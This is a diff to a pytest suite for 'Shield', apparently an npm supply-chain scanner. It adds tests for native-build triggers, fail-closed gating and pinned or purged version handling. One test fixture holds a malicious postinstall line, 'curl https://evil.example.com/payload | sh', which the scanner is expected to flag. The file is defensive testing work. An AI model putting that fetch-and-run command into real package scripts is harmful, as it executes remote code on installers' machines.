@@ -12,6 +12,7 @@ import pytest
 from daemon.config import Settings, get_settings
 from daemon.models import PillarScore
 from daemon.pillars.shield import Shield, _scripts_and_deps_equal
+from daemon.utils.npm_registry import RegistryLookup, RegistryResult
 
 
 @pytest.fixture
@@ -389,7 +390,7 @@ async def test_score_fetches_metadata_when_none(shield: Shield) -> None:
     """score() fetches metadata from registry when package_metadata=None (line 296)."""
     with (
         patch("daemon.pillars.shield.get_package_metadata",
-              new=AsyncMock(return_value={"readme": "", "description": ""})),
+              new=AsyncMock(return_value=RegistryResult(RegistryLookup.EXISTS, {"readme": "", "description": ""}))),
         patch("daemon.pillars.shield.get_settings",
               return_value=_settings_with_llm(enabled=False)),
         patch.object(Shield, "scan_package_files",
@@ -487,7 +488,8 @@ def _versions_meta(cur_extra: dict | None = None, prev_extra: dict | None = None
     to make them differ)."""
     base_cur = {"scripts": {}, "dependencies": {"lodash": "^4.0.0"},
                 "dist": {"tarball": "https://registry.example.com/pkg/-/pkg-2.0.0.tgz"}}
-    base_prev = {"scripts": {}, "dependencies": {"lodash": "^4.0.0"}}
+    base_prev = {"scripts": {}, "dependencies": {"lodash": "^4.0.0"},
+                 "dist": {"tarball": "https://registry.example.com/pkg/-/pkg-1.0.0.tgz"}}
     if cur_extra:
         base_cur.update(cur_extra)
     if prev_extra:
@@ -514,6 +516,8 @@ async def test_manifest_gating_skips_diff_when_identical(shield: Shield) -> None
                      new=AsyncMock(return_value=(40.0, [], {"files_scanned": 1, "flags": 0, "skipped": None}))),
         patch("daemon.utils.npm_registry.get_previous_version",
               new=AsyncMock(return_value="1.0.0")),
+        patch("daemon.pillars.shield.tarball_has_member",
+              new=AsyncMock(return_value=False)),
         patch("daemon.utils.diff_analyzer.diff_package_versions",
               new=AsyncMock()) as mock_diff,
     ):
@@ -604,6 +608,292 @@ async def test_manifest_gating_skipped_when_prev_manifest_absent(shield: Shield)
         await shield.score("some-pkg", package_metadata=meta)
 
     mock_diff.assert_called_once()
+
+
+# ── Native-build auto-execution trigger ("Phantom Gyp") ───────────────────────
+
+@pytest.mark.asyncio
+async def test_native_trigger_forces_diff_when_binding_gyp_added(shield: Shield) -> None:
+    """Manifests are otherwise identical, but binding.gyp is newly introduced
+    in the current version — this must force the full diff even though
+    _scripts_and_deps_equal alone would have skipped it (the Phantom Gyp
+    reproduction)."""
+    meta = _versions_meta()
+    diff_result = {"diff_score": 30.0, "diff_flags": ["native_build_trigger_added"],
+                    "new_imports": [], "new_network_calls": False}
+    with (
+        patch("daemon.pillars.shield.get_settings",
+              return_value=_settings_with_llm(enabled=False)),
+        patch("daemon.pillars.shield.get_admin_config", return_value={}),
+        patch.object(Shield, "scan_package_files",
+                     new=AsyncMock(return_value=(0.0, [], {"files_scanned": 0, "flags": 0, "skipped": None}))),
+        patch("daemon.utils.npm_registry.get_previous_version",
+              new=AsyncMock(return_value="1.0.0")),
+        patch("daemon.pillars.shield.tarball_has_member",
+              new=AsyncMock(side_effect=[True, False])),
+        patch("daemon.utils.diff_analyzer.diff_package_versions",
+              new=AsyncMock(return_value=diff_result)) as mock_diff,
+    ):
+        result = await shield.score("some-pkg", package_metadata=meta)
+
+    mock_diff.assert_called_once()
+    assert result.metadata["diff_score"] == 30.0
+
+
+@pytest.mark.asyncio
+async def test_native_trigger_skips_diff_when_absent_in_both(shield: Shield) -> None:
+    """binding.gyp absent in both versions — no transition, gate still skips."""
+    meta = _versions_meta()
+    with (
+        patch("daemon.pillars.shield.get_settings",
+              return_value=_settings_with_llm(enabled=False)),
+        patch("daemon.pillars.shield.get_admin_config", return_value={}),
+        patch.object(Shield, "scan_package_files",
+                     new=AsyncMock(return_value=(0.0, [], {"files_scanned": 0, "flags": 0, "skipped": None}))),
+        patch("daemon.utils.npm_registry.get_previous_version",
+              new=AsyncMock(return_value="1.0.0")),
+        patch("daemon.pillars.shield.tarball_has_member",
+              new=AsyncMock(side_effect=[False, False])),
+        patch("daemon.utils.diff_analyzer.diff_package_versions",
+              new=AsyncMock()) as mock_diff,
+    ):
+        await shield.score("some-pkg", package_metadata=meta)
+
+    mock_diff.assert_not_called()
+
+
+@pytest.mark.asyncio
+async def test_native_trigger_undetermined_forces_diff(shield: Shield) -> None:
+    """An undetermined tarball listing (network hiccup, cap exceeded, etc.)
+    must fail closed — force the diff rather than trust an ambiguous read."""
+    meta = _versions_meta()
+    diff_result = {"diff_score": 0.0, "diff_flags": [], "new_imports": [], "new_network_calls": False}
+    with (
+        patch("daemon.pillars.shield.get_settings",
+              return_value=_settings_with_llm(enabled=False)),
+        patch("daemon.pillars.shield.get_admin_config", return_value={}),
+        patch.object(Shield, "scan_package_files",
+                     new=AsyncMock(return_value=(0.0, [], {"files_scanned": 0, "flags": 0, "skipped": None}))),
+        patch("daemon.utils.npm_registry.get_previous_version",
+              new=AsyncMock(return_value="1.0.0")),
+        patch("daemon.pillars.shield.tarball_has_member",
+              new=AsyncMock(return_value=None)),
+        patch("daemon.utils.diff_analyzer.diff_package_versions",
+              new=AsyncMock(return_value=diff_result)) as mock_diff,
+    ):
+        await shield.score("some-pkg", package_metadata=meta)
+
+    mock_diff.assert_called_once()
+
+
+@pytest.mark.asyncio
+async def test_native_trigger_check_disabled_via_admin_config(shield: Shield) -> None:
+    """shield_native_trigger_check=False must skip this sub-check entirely
+    (old manifest-only gating behavior preserved) without even calling
+    tarball_has_member."""
+    meta = _versions_meta()
+    with (
+        patch("daemon.pillars.shield.get_settings",
+              return_value=_settings_with_llm(enabled=False)),
+        patch("daemon.pillars.shield.get_admin_config",
+              return_value={"shield_native_trigger_check": False}),
+        patch.object(Shield, "scan_package_files",
+                     new=AsyncMock(return_value=(0.0, [], {"files_scanned": 0, "flags": 0, "skipped": None}))),
+        patch("daemon.utils.npm_registry.get_previous_version",
+              new=AsyncMock(return_value="1.0.0")),
+        patch("daemon.pillars.shield.tarball_has_member",
+              new=AsyncMock(side_effect=AssertionError("must not be called"))) as mock_check,
+        patch("daemon.utils.diff_analyzer.diff_package_versions",
+              new=AsyncMock()) as mock_diff,
+    ):
+        await shield.score("some-pkg", package_metadata=meta)
+
+    mock_check.assert_not_called()
+    mock_diff.assert_not_called()
+
+
+@pytest.mark.asyncio
+async def test_native_trigger_missing_tarball_url_forces_diff(shield: Shield) -> None:
+    """If either manifest lacks a dist.tarball URL, the native-trigger check
+    can't run and must fail closed (force the diff)."""
+    meta = _versions_meta(prev_extra={"dist": {}})
+    diff_result = {"diff_score": 0.0, "diff_flags": [], "new_imports": [], "new_network_calls": False}
+    with (
+        patch("daemon.pillars.shield.get_settings",
+              return_value=_settings_with_llm(enabled=False)),
+        patch("daemon.pillars.shield.get_admin_config", return_value={}),
+        patch.object(Shield, "scan_package_files",
+                     new=AsyncMock(return_value=(0.0, [], {"files_scanned": 0, "flags": 0, "skipped": None}))),
+        patch("daemon.utils.npm_registry.get_previous_version",
+              new=AsyncMock(return_value="1.0.0")),
+        patch("daemon.utils.diff_analyzer.diff_package_versions",
+              new=AsyncMock(return_value=diff_result)) as mock_diff,
+    ):
+        await shield.score("some-pkg", package_metadata=meta)
+
+    mock_diff.assert_called_once()
+
+
+# ── Requested-version resolution (not always dist-tags.latest) ────────────────
+#
+# Regression coverage for a real bug: score() previously ignored the requested
+# version entirely and always resolved scripts/tarball/diff-baseline against
+# dist-tags.latest, so pinning an older (possibly compromised) version scanned
+# the wrong artifact. router.py now passes req.version through; these tests
+# pin that behavior at the Shield level.
+
+def _pinned_version_meta() -> dict:
+    """Two published versions with materially different scripts, so a test can
+    assert which one Shield actually resolved against."""
+    return {
+        "dist-tags": {"latest": "2.0.0"},
+        "versions": {
+            "2.0.0": {
+                "scripts": {},
+                "dependencies": {},
+                "dist": {"tarball": "https://registry.example.com/pkg/-/pkg-2.0.0.tgz"},
+            },
+            "1.0.0": {
+                "scripts": {"postinstall": "curl https://evil.example.com/payload | sh"},
+                "dependencies": {},
+                "dist": {"tarball": "https://registry.example.com/pkg/-/pkg-1.0.0.tgz"},
+            },
+        },
+        "readme": "", "description": "",
+    }
+
+
+def test_tarball_url_from_metadata_resolves_requested_version(shield: Shield) -> None:
+    meta = _pinned_version_meta()
+    assert Shield._tarball_url_from_metadata(meta, "1.0.0") == "https://registry.example.com/pkg/-/pkg-1.0.0.tgz"
+
+
+def test_tarball_url_from_metadata_falls_back_to_latest_when_version_unresolvable(shield: Shield) -> None:
+    meta = _pinned_version_meta()
+    assert Shield._tarball_url_from_metadata(meta, "9.9.9") == "https://registry.example.com/pkg/-/pkg-2.0.0.tgz"
+    assert Shield._tarball_url_from_metadata(meta, None) == "https://registry.example.com/pkg/-/pkg-2.0.0.tgz"
+
+
+@pytest.mark.asyncio
+async def test_fetch_install_scripts_resolves_requested_version(shield: Shield) -> None:
+    meta = _pinned_version_meta()
+    scripts = await shield.fetch_install_scripts("some-pkg", meta, "1.0.0")
+    assert scripts.get("postinstall") == "curl https://evil.example.com/payload | sh"
+
+
+@pytest.mark.asyncio
+async def test_fetch_install_scripts_falls_back_to_latest_without_version(shield: Shield) -> None:
+    meta = _pinned_version_meta()
+    scripts = await shield.fetch_install_scripts("some-pkg", meta, None)
+    assert scripts == {}
+
+
+@pytest.mark.asyncio
+async def test_score_scans_pinned_older_version_not_latest(shield: Shield) -> None:
+    """The motivating case: latest (2.0.0) is clean, but the caller pinned the
+    malicious 1.0.0 — score() must catch the postinstall payload, not silently
+    scan 2.0.0 and report clean."""
+    meta = _pinned_version_meta()
+    with (
+        patch("daemon.pillars.shield.get_settings",
+              return_value=_settings_with_llm(enabled=False)),
+        patch("daemon.pillars.shield.get_admin_config", return_value={}),
+        patch.object(Shield, "scan_package_files",
+                     new=AsyncMock(return_value=(0.0, [], {"files_scanned": 0, "flags": 0, "skipped": None}))),
+        patch("daemon.utils.npm_registry.get_previous_version",
+              new=AsyncMock(return_value=None)),
+    ):
+        result = await shield.score("some-pkg", package_metadata=meta, version="1.0.0")
+
+    assert "network_in_install" in result.flags
+    assert result.score > 0.0
+
+
+@pytest.mark.asyncio
+async def test_score_without_version_still_scans_latest(shield: Shield) -> None:
+    """version=None (the pre-existing default) must keep resolving to latest,
+    same as before this fix — a package pinned to nothing (npm install pkg)
+    is the common case and must stay unaffected."""
+    meta = _pinned_version_meta()
+    with (
+        patch("daemon.pillars.shield.get_settings",
+              return_value=_settings_with_llm(enabled=False)),
+        patch("daemon.pillars.shield.get_admin_config", return_value={}),
+        patch.object(Shield, "scan_package_files",
+                     new=AsyncMock(return_value=(0.0, [], {"files_scanned": 0, "flags": 0, "skipped": None}))),
+        patch("daemon.utils.npm_registry.get_previous_version",
+              new=AsyncMock(return_value=None)),
+    ):
+        result = await shield.score("some-pkg", package_metadata=meta, version=None)
+
+    assert result.score == 0.0
+    assert "network_in_install" not in result.flags
+
+
+# ── Requested version purged/unresolved: explicit state, no silent substitution ──
+#
+# Regression coverage for a real bug: when the pinned version isn't in the
+# registry's versions map (e.g. npm purged a malicious release entirely),
+# score() used to silently fall back to scanning dist-tags.latest — a
+# different, unrelated, clean artifact — and return a normal-looking verdict
+# with no indication a substitution happened. It must now say so explicitly.
+
+@pytest.mark.asyncio
+async def test_score_returns_unresolved_state_when_version_purged(shield: Shield) -> None:
+    meta = _pinned_version_meta()  # only "1.0.0" and "2.0.0" exist
+    with patch.object(Shield, "scan_package_files", new=AsyncMock()) as mock_scan:
+        result = await shield.score("some-pkg", package_metadata=meta, version="9.9.9-purged")
+
+    assert result.flags == ["requested_version_unresolved"]
+    assert result.confidence == 0.0
+    assert result.metadata["tarball_url"] is None
+    assert result.metadata["requested_version"] == "9.9.9-purged"
+    # Must not fall through to scanning a substituted (e.g. latest) tarball.
+    mock_scan.assert_not_called()
+
+
+@pytest.mark.asyncio
+async def test_score_unresolved_version_does_not_run_diff(shield: Shield) -> None:
+    meta = _pinned_version_meta()
+    with (
+        patch.object(Shield, "scan_package_files", new=AsyncMock()),
+        patch("daemon.utils.diff_analyzer.diff_package_versions", new=AsyncMock()) as mock_diff,
+    ):
+        await shield.score("some-pkg", package_metadata=meta, version="9.9.9-purged")
+
+    mock_diff.assert_not_called()
+
+
+@pytest.mark.asyncio
+async def test_score_empty_versions_map_does_not_trigger_unresolved_state(shield: Shield) -> None:
+    """A totally empty/unavailable versions map (registry miss, not a purge)
+    must NOT be treated as 'requested_version_unresolved' — there's no
+    positive evidence the package even exists, so the existing degrade-
+    gracefully-to-empty-scan behavior applies instead."""
+    meta = {"versions": {}, "readme": "", "description": ""}
+    with patch.object(Shield, "scan_package_files",
+                       new=AsyncMock(return_value=(0.0, [], {"files_scanned": 0, "flags": 0, "skipped": None}))):
+        result = await shield.score("ghost-pkg", package_metadata=meta, version="1.0.0")
+
+    assert "requested_version_unresolved" not in result.flags
+
+
+@pytest.mark.asyncio
+async def test_stage1_gate_floors_warn_for_unresolved_shield_version() -> None:
+    """End-to-end: the aggregator must floor at WARN when Shield reports it
+    couldn't examine the requested (purged) version, even if Contextify and
+    Sentinel are both quiet."""
+    from daemon.config import get_settings
+    from daemon.models import PillarScore
+    from daemon.pillars.aggregator import Aggregator
+
+    get_settings.cache_clear()
+    settings = get_settings()
+    ctx = PillarScore(score=0.0, confidence=0.9, flags=[], metadata={})
+    sen = PillarScore(score=0.0, confidence=0.9, flags=[], metadata={})
+    shi = PillarScore(score=0.0, confidence=0.0, flags=["requested_version_unresolved"], metadata={})
+    score, _ = Aggregator().aggregate(ctx, sen, shi, settings)
+    assert Aggregator().get_decision(score, settings) == "WARN"
 
 
 # ── AST: destructuring env access (lines 218-222) ────────────────────────────
